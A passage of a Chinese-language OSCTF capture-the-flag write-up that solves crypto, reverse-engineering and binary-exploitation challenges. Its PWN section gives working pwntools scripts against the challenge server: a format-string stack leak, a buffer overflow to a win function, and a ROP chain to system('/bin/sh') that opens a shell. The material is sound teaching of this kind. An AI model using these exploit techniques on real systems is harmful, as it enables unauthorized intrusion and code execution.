+<p><em>加密逻辑</em><br>to_my_honey(owo): 将字符转换为其在字母表中的位置（从0开始）</p>
+<p>from_your_lover(uwu): 将数字转回字符，考虑字母表的环绕</p>
+<p>encrypt(billet_doux): 对于字符串中的每个字符，根据字符的位置进行调整，并使用上述两个函数处理字母字符</p>
+<p><em>解密函数</em><br>解密函数的工作是将加密逻辑反转：</p>
+<p>对于每个字母，将字符转换为其字母表中的位置</p>
+<p>从这个位置中减去字符在字符串中的索引</p>
+<p>将结果模26，并将其转换回字母</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def to_my_honey(owo):</span><br><span class="line">    return ord(owo) - 0x41</span><br><span class="line">def from_your_lover(uwu):</span><br><span class="line">    return chr(uwu % 26 + 0x41)</span><br><span class="line">def decrypt(encrypted_message):</span><br><span class="line">    letter = &#x27;&#x27;</span><br><span class="line">    for heart in range(len(encrypted_message)):</span><br><span class="line">        letters = encrypted_message[heart]</span><br><span class="line">        if not letters.isalpha():</span><br><span class="line">            owo = letters</span><br><span class="line">        else:</span><br><span class="line">            uwu = to_my_honey(letters)</span><br><span class="line">            # Reverse the index addition and handle negative values correctly</span><br><span class="line">            original_position = (uwu - heart) % 26</span><br><span class="line">            owo = from_your_lover(original_position)</span><br><span class="line">        letter += owo</span><br><span class="line">    return letter</span><br><span class="line">encrypted_message = &#x27;KJOL_T_ZCTS_ZV_CQKLX_NDFKZTUC.&#x27;</span><br><span class="line">decrypted_message = decrypt(encrypted_message)</span><br><span class="line">print(&quot;Decrypted Message:&quot;, decrypted_message)</span><br></pre></td></tr></table></figure>
+
+<p>最后这个结果莫名其妙，但是确实是对的。也许这就是爱情吧（love story）</p>
+<p><strong>OSCTF{KIMI_O_SUKI_NI_NATTE_SHIMATTA.}</strong></p>
+<h2 id="Cipher-Conundrum"><a href="#Cipher-Conundrum" class="headerlink" title="Cipher Conundrum"></a>Cipher Conundrum</h2><p>难度：简单</p>
+<p>encrypted.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NDc0YjM0NGMzNzdiNTg2NzVmNDU1NjY2NTE1ZjM0NTQ2ODM5NzY0YTZiNmI2YjZiNmI3ZA==</span><br></pre></td></tr></table></figure>
+
+<p>赛博厨子可以梭</p>
+<p><img src="/images/migrated/18301878/04.png"></p>
+<p>梭了吗，如梭</p>
+<p>ROT爆破出</p>
+<p><img src="/images/migrated/18301878/05.png"></p>
+<blockquote>
+<p>Base64 -&gt; HEX -&gt; ROT8</p>
+</blockquote>
+<p><strong>OSCTF{5o_M3nY_C1ph3Rsssss}</strong></p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Gophers-Language"><a href="#Gophers-Language" class="headerlink" title="Gophers Language"></a>Gophers Language</h2><p>难度：热身</p>
+<p>无壳，64位，IDA打开</p>
+<p>直接发现main_main，出题人他真的我哭死</p>
+<p>F5反编译，显然，这里的v13就是我们输入的值</p>
+<p><img src="/images/migrated/18301878/06.png"></p>
+<p>发现首先使用了一个if判断了v13的长度是否为21，由此得知flag长度为21</p>
+<p>这样我们就可以把断点打进runtime_memequal里了</p>
+<p><img src="/images/migrated/18301878/07.png"></p>
+<p>比较处下断点，F9调试输入任意长度为21的字符串，如123456789123456789123</p>
+<p>运行到断点处后双击v1查看v1值即可</p>
+<p><img src="/images/migrated/18301878/08.png"></p>
+<p><strong>OSCTF{Why_G0_S0_H4rd}</strong></p>
+<h2 id="Another-Python-Game"><a href="#Another-Python-Game" class="headerlink" title="Another Python Game"></a>Another Python Game</h2><p>难度：热身</p>
+<p>pyinstxtractor.py对着source.exe文件梭出pyc文件</p>
+<p>直接在线工具反编译即可</p>
+<p><img src="/images/migrated/18301878/09.png"></p>
+<p>(小声)不是就这难度谁会bruteforce啊(汗)</p>
+<p><strong>OSCTF{1_5W3ar_I_D1dn’7_BruT3f0rc3}</strong></p>
+<h2 id="The-Broken-Sword"><a href="#The-Broken-Sword" class="headerlink" title="The Broken Sword"></a>The Broken Sword</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from secret import flag,a,v2,pi</span><br><span class="line"></span><br><span class="line">z1 = a+flag</span><br><span class="line">y = long_to_bytes(z1)</span><br><span class="line">print(&quot;The message is&quot;,y)</span><br><span class="line">s = &#x27;&#x27;</span><br><span class="line">s += chr(ord(&#x27;a&#x27;)+23)</span><br><span class="line">v = ord(s)</span><br><span class="line">f = 5483762481^v</span><br><span class="line">g = f*35</span><br><span class="line"></span><br><span class="line">r = 14</span><br><span class="line">l = g</span><br><span class="line">surface_area= pi*r*l</span><br><span class="line">w = surface_area//1</span><br><span class="line">s = int(f)</span><br><span class="line">v = s^34</span><br><span class="line">for i in range(1,10,1):</span><br><span class="line">    h = v2*30</span><br><span class="line">    h ^= 34</span><br><span class="line">    h *= pi</span><br><span class="line">    h /= 4567234567342</span><br><span class="line">a += g+v2+f</span><br><span class="line">a *= 67 </span><br><span class="line">al=a</span><br><span class="line">print(&quot;a1:&quot;,al)</span><br><span class="line">print(&#x27;h:&#x27;,h)</span><br><span class="line"></span><br><span class="line">#The message is b&#x27;\x0c\x07\x9e\x8e/\xc2&#x27;</span><br><span class="line">#a1 is: 899433952965498</span><br><span class="line">#h is: 0.0028203971921452278</span><br></pre></td></tr></table></figure>
+
+<p>题目难度不是很大，唯一需要做的就是把pi的值找出来因为不知道是多少个小数点位。可以写一个简单的脚本来验证是否是正确的pi。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v2=0.0028203971921452278</span><br><span class="line">v2*=4567234567342</span><br><span class="line">v2/=3.14</span><br><span class="line">v2=int(v2)</span><br><span class="line">v2^=34</span><br><span class="line">v2/=30</span><br><span class="line">print(int(v2))</span><br><span class="line"></span><br><span class="line">v2=int(v2)</span><br><span class="line">h = v2*30</span><br><span class="line">h ^= 34</span><br><span class="line">h *= 3.14</span><br><span class="line">h /= 4567234567342</span><br><span class="line">print(h)</span><br><span class="line">print(h==0.0028203971921452278)</span><br></pre></td></tr></table></figure>
+
+<p>当pi确定是对的，那就可以求出v2。有了v2就可以用z3来逆向出flag和a的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">pi=3.14</span><br><span class="line">f=5483762505</span><br><span class="line">g=191931687675</span><br><span class="line">z1=13226864422850</span><br><span class="line">v2=136745387</span><br><span class="line">a1=899433952965498</span><br><span class="line"></span><br><span class="line">a=Int(&#x27;a&#x27;)</span><br><span class="line">flag=Int(&#x27;flag&#x27;)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(a+flag==z1)</span><br><span class="line">s.add((a+g+v2+f)*67==a1)</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">print(&quot;OSCTF&#123;&quot;+str(s.model()[flag].as_long())+&quot;_&quot;+str(s.model()[a].as_long())+&quot;_&quot;+str(v2)+&quot;&#125;&quot;)</span><br><span class="line"></span><br><span class="line">#OSCTF&#123;29260723_13226835162127_136745387&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>OSCTF{29260723_13226835162127_136745387}</strong></p>
+<h2 id="Avengers-Assemble"><a href="#Avengers-Assemble" class="headerlink" title="Avengers Assemble"></a>Avengers Assemble</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">asm</span><br><span class="line">extern printf</span><br><span class="line">extern scanf</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">        fmt: db &quot;%ld&quot;,0</span><br><span class="line">        output: db &quot;Correct&quot;,10,0</span><br><span class="line">        out: db &quot;Not Correct&quot;,10,0</span><br><span class="line">        inp1: db &quot;Input 1st number:&quot;,0</span><br><span class="line">        inp2: db &quot;Input 2nd number:&quot;,0</span><br><span class="line">        inp3: db &quot;Input 3rd number:&quot;,0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">        global main</span><br><span class="line"> </span><br><span class="line">        main:</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp,esp</span><br><span class="line">        sub esp,0x20</span><br><span class="line"> </span><br><span class="line">        push inp1</span><br><span class="line">        call printf</span><br><span class="line">        lea eax,[ebp-0x4]</span><br><span class="line">        push eax</span><br><span class="line">        push fmt</span><br><span class="line">        call scanf</span><br><span class="line"></span><br><span class="line">        push inp2</span><br><span class="line">        call printf</span><br><span class="line">        lea eax,[ebp-0xc]</span><br><span class="line">        push eax</span><br><span class="line">        push fmt</span><br><span class="line">        call scanf</span><br><span class="line"></span><br><span class="line">        push inp3</span><br><span class="line">        call printf</span><br><span class="line">        lea eax,[ebp-0x14]</span><br><span class="line">        push eax</span><br><span class="line">        push fmt</span><br><span class="line">        call scanf</span><br><span class="line"></span><br><span class="line">        mov ebx, DWORD[ebp-0xc]</span><br><span class="line">        add ebx, DWORD[ebp-0x4]</span><br><span class="line">        cmp ebx,0xdeadbeef</span><br><span class="line">        jne N</span><br><span class="line"></span><br><span class="line">        cmp DWORD[ebp-0x4], 0x6f56df65</span><br><span class="line">        jg N</span><br><span class="line"></span><br><span class="line">        cmp DWORD[ebp-0xc], 0x6f56df8d</span><br><span class="line">        jg N</span><br><span class="line">        cmp DWORD[ebp-0xc], 0x6f56df8d</span><br><span class="line">        jl N</span><br><span class="line"></span><br><span class="line">        mov ecx, DWORD[ebp-0x14]</span><br><span class="line">        mov ebx, DWORD[ebp-0xc]</span><br><span class="line">        xor ecx, ebx</span><br><span class="line">        cmp ecx, 2103609845</span><br><span class="line">        jne N</span><br><span class="line">        jmp O</span><br><span class="line"></span><br><span class="line">        N:</span><br><span class="line">        push out</span><br><span class="line">        call printf</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">        O:</span><br><span class="line">        push output</span><br><span class="line">        call printf</span><br><span class="line"></span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
+
+<p>简单看了代码，只要保证不调到最N函数就可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">push inp1</span><br><span class="line">call printf</span><br><span class="line">lea eax,[ebp-0x4]</span><br><span class="line">push eax</span><br><span class="line">push fmt</span><br><span class="line">call scanf</span><br><span class="line"></span><br><span class="line">push inp2</span><br><span class="line">call printf</span><br><span class="line">lea eax,[ebp-0xc]</span><br><span class="line">push eax</span><br><span class="line">push fmt</span><br><span class="line">call scanf</span><br><span class="line"></span><br><span class="line">push inp3</span><br><span class="line">call printf</span><br><span class="line">lea eax,[ebp-0x14]</span><br><span class="line">push eax</span><br><span class="line">push fmt</span><br><span class="line">call scanf</span><br></pre></td></tr></table></figure>
+
+<p>分析这段汇编，得知ebp-0x4&#x3D;inp1, ebp-0xc&#x3D;inp2, ebp-0x14&#x3D;inp3。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, DWORD[ebp-0xc]</span><br><span class="line">add ebx, DWORD[ebp-0x4]</span><br><span class="line">cmp ebx,0xdeadbeef</span><br><span class="line">jne N</span><br><span class="line">cmp DWORD[ebp-0x4], 0x6f56df65</span><br><span class="line">jg N</span><br></pre></td></tr></table></figure>
+
+<p>前四行要就inp1+inp2&#x3D;0xdeadbeef，之后inp1要小于0x6f56df65。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmp DWORD[ebp-0xc], 0x6f56df8d</span><br><span class="line">jg N</span><br><span class="line">cmp DWORD[ebp-0xc], 0x6f56df8d</span><br><span class="line">jl N</span><br></pre></td></tr></table></figure>
+
+<p>inp2必须不能大于0x6f56df8d或者小于，那它必须等于0x6f56df8d</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ecx, DWORD[ebp-0x14]</span><br><span class="line">mov ebx, DWORD[ebp-0xc]</span><br><span class="line">xor ecx, ebx</span><br><span class="line">cmp ecx, 2103609845</span><br><span class="line">jne N</span><br><span class="line">jmp O</span><br></pre></td></tr></table></figure>
+
+<p>inp2 xor inp3 &#x3D; 2103609845，根据布尔代数a^b&#x3D;c, a^c&#x3D;b，那inp2 xor 2103609845 &#x3D; inp3</p>
+<p>最终代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">inp2=0x6f56df8d</span><br><span class="line">inp3=inp2^2103609845</span><br><span class="line">inp1=0xdeadbeef-inp2</span><br><span class="line">print(&quot;OSCTF&#123;&quot;+str(inp1)+&quot;_&quot;+str(inp2)+&quot;_&quot;+str(inp3)+&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>OSCTF{1867964258_1867964301_305419896}</strong></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Leaky-Pipes"><a href="#Leaky-Pipes" class="headerlink" title="Leaky Pipes"></a>Leaky Pipes</h2><p>在 <code>vuln</code> 函数中存在一个格式字符串漏洞，标志也被读入堆栈。因此，可以使用格式字符串泄漏堆栈值来获取标志。</p>
+<p>源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[128]; // [esp+0h] [ebp-C8h] BYREF</span><br><span class="line">  char v2[68]; // [esp+80h] [ebp-48h] BYREF</span><br><span class="line"></span><br><span class="line">  readflag(v2, 64);</span><br><span class="line">  printf(&quot;Tell me your secret so I can reveal mine ;) &gt;&gt; &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%127s&quot;, v1);</span><br><span class="line">  puts(&quot;Here&#x27;s your secret.. I ain&#x27;t telling mine :p&quot;);</span><br><span class="line">  printf(v1);</span><br><span class="line">  return putchar(10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过编写暴力破解脚本，我们可以找到flag在堆栈中的位置。</p>
+<p>标志位置查找器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">        payload=&quot;%&quot;+str(i)+&quot;$p&quot;</span><br><span class="line">        io=remote(&quot;34.125.199.248&quot;, 1337)</span><br><span class="line">        io.recvuntil(&#x27;&gt;&gt;&#x27;)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        io.recvline()</span><br><span class="line">        back=io.recvline().split(&quot;\n&quot;)</span><br><span class="line">        if back[0]==&quot;(nil)&quot;:</span><br><span class="line">                continue</span><br><span class="line">        back=back[0].split(&quot;0x&quot;)[1]</span><br><span class="line">        if len(back)%2!=0:</span><br><span class="line">                back=&quot;0&quot;+back</span><br><span class="line">        print back.decode(&quot;hex&quot;)[::-1]</span><br><span class="line">        #36 45</span><br></pre></td></tr></table></figure>
+
+<p>利用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(36,45):</span><br><span class="line">        payload=&quot;%&quot;+str(i)+&quot;$p&quot;</span><br><span class="line">        io=remote(&quot;34.125.199.248&quot;, 1337)</span><br><span class="line">        io.recvuntil(&#x27;&gt;&gt;&#x27;)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        io.recvline()</span><br><span class="line"></span><br><span class="line">        back=io.recvline().split(&quot;\n&quot;)</span><br><span class="line">        if back[0]==&quot;(nil)&quot;:</span><br><span class="line">                continue</span><br><span class="line">        back=back[0].split(&quot;0x&quot;)[1]</span><br><span class="line">        if len(back)%2!=0:</span><br><span class="line">                back=&quot;0&quot;+back</span><br><span class="line">        flag+=back.decode(&quot;hex&quot;)[::-1]</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+
+<p>注：此挑战使用的脚本与picoctf的flag_leak挑战相同。</p>
+<h2 id="Buffer-Buffet"><a href="#Buffer-Buffet" class="headerlink" title="Buffer Buffet"></a>Buffer Buffet</h2><p>分析代码，发现使用 <code>gets</code> 函数读取输入时存在明显的缓冲区溢出漏洞。</p>
+<p>源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[400]; // [rsp+0h] [rbp-190h] BYREF</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter some text:&quot;);</span><br><span class="line">  gets(v1);</span><br><span class="line">  printf(&quot;You entered: %s\n&quot;, v1);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在地址 <code>0x04011D6</code> 处也有一个 <code>win</code> 函数。</p>
+<p>通过在gdb中使用循环模式并进行调试，我们发现到返回地址的偏移量为408字节。</p>
+<p>循环模式生成器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def hex2str(hex_string):</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    for i in range(0, len(hex_string), 2):</span><br><span class="line">        hex_pair = hex_string[i:i+2]</span><br><span class="line">        decimal_value = int(hex_pair, 16)</span><br><span class="line">        char = chr(decimal_value)</span><br><span class="line">        result += char</span><br><span class="line">    return result</span><br><span class="line">testlen=int(input(&quot;Requested Test String Length(Max 5564 Characters): &quot;))</span><br><span class="line">v=True</span><br><span class="line">version=input(&quot;1. 32 Bit\n2. 64 Bit\n&quot;)</span><br><span class="line">if version==2:</span><br><span class="line">    v=False</span><br><span class="line">if testlen&gt;5564:</span><br><span class="line">    print(&quot;Too Large&quot;)</span><br><span class="line">    exit()</span><br><span class="line">a=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">length=0</span><br><span class="line">padding=&quot;&quot;</span><br><span class="line">for i in range(len(a)):</span><br><span class="line">    payload = a[i] * 4</span><br><span class="line">    for j in range(i+1,len(a)):</span><br><span class="line">        payload+=a[j]+a[i]*3</span><br><span class="line">    padding+=str(payload)+&#x27;0&#x27;</span><br><span class="line">padding=padding[0:testlen]</span><br><span class="line">print &quot;Test String:&quot;,padding</span><br><span class="line">back=input(&quot;Segfault Output: &quot;)</span><br><span class="line">back=hex2str(hex(back).split(&#x27;0x&#x27;)[1])[::-1]</span><br><span class="line">if not v:</span><br><span class="line">    back=back[:4]</span><br><span class="line">padding=padding.split(back)</span><br><span class="line">print &quot;Padding is&quot;,len(padding[0])</span><br><span class="line">print &quot;A&quot;*len(padding[0])</span><br></pre></td></tr></table></figure>
+
+<p>利用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io=remote(&quot;34.125.199.248&quot;, 4056)</span><br><span class="line">payload=&quot;A&quot;*408+p64(0x04011D6)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;:&quot;,payload)</span><br><span class="line">print io.recvuntil(&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Byte-Breakup"><a href="#Byte-Breakup" class="headerlink" title="Byte Breakup"></a>Byte Breakup</h2><p>分析代码发现，这里同样存在缓冲区溢出漏洞。虽然只有一个调用 <code>/bin/ls</code> 的函数，但这并不是我们想要的。</p>
+<p>有两种方法可以解决这个问题：第一种方法需要泄露 <code>libc</code> 以创建完整的ROP链，通过 <code>ret2libc</code>。然而，还有一种更简单的方法可以在不创建复杂ROP链的情况下进行利用。</p>
+<p>源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">lea     rax, command    ; &quot;/bin/ls&quot;</span><br><span class="line">mov     rdi, rax        ; command</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _system</span><br><span class="line">nop</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>这是 <code>soClose</code> 函数的汇编代码，如果我们获取 <code>call _system</code> 的地址，我们基本上可以控制任意命令，只要我们也能控制 <code>rdi</code> 寄存器。</p>
+<p>幸运的是，通过运行 <code>ROPgadget</code>，我们在 <code>0x04012bb</code> 处找到了一个 <code>pop rdi</code> gadget。通过运行 <code>ROPgadget --binary chal</code>，你将看到所有的gadget。</p>
+<p>二进制文件中也有 <code>/bin/sh</code>，通过运行 <code>strings -a -t x chal | grep /bin/sh</code>，我们也可以得到它的地址。它在地址 <code>0x3048</code>，但还需要添加 <code>0x401000</code> 作为基地址。</p>
+<p>利用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">bin_sh=p64(0x404048)</span><br><span class="line">system=p64(0x0401257)</span><br><span class="line">pop_rdi=p64(0x004012bb)</span><br><span class="line">io=remote(&quot;34.125.199.248&quot;, 6969)</span><br><span class="line">payload=&quot;A&quot;*40+pop_rdi+bin_sh+system</span><br><span class="line">io.sendlineafter(&quot;:&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>注：给定了 <code>libc</code> 文件，但并不必要使用它进行解决，有类似的方法可以使用 <code>libc</code> 文件解决，但会更复杂。</p>
+<h2 id="seed-sPRING"><a href="#seed-sPRING" class="headerlink" title="seed sPRING"></a>seed sPRING</h2><p>令人惊讶的是，这个问题与 picoCTF 的 seed sPRING 非常相似。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/HHousen/PicoCTF-2019/blob/24b0981c72638c12f9a8572f81e1abbcf8de306d/Binary%20Exploitation/seed-sPRiNG/solve.c">https://github.com/HHousen/PicoCTF-2019/blob/24b0981c72638c12f9a8572f81e1abbcf8de306d/Binary Exploitation/seed-sPRiNG/solve.c</a></p>
+<p>这是我找到的解决脚本。通过编译它并使用 <code>./solve | nc 34.125.199.248 2534</code> 运行，它将在几次尝试中解决。</p>
+<h2 id="ShellMischief"><a href="#ShellMischief" class="headerlink" title="ShellMischief"></a>ShellMischief</h2><p>程序基本上运行任意代码，但在随机位置。通过添加一个 <code>nop</code> 滑道可以解决问题。然而，我们的团队以不同的方式解决了它。</p>
+<p>通过找到 <code>ret</code> gadget，我们创建了一个 <code>ret</code> 滑道，它的作用与 <code>nop</code> 滑道相同。</p>
+<p>利用脚本</p>
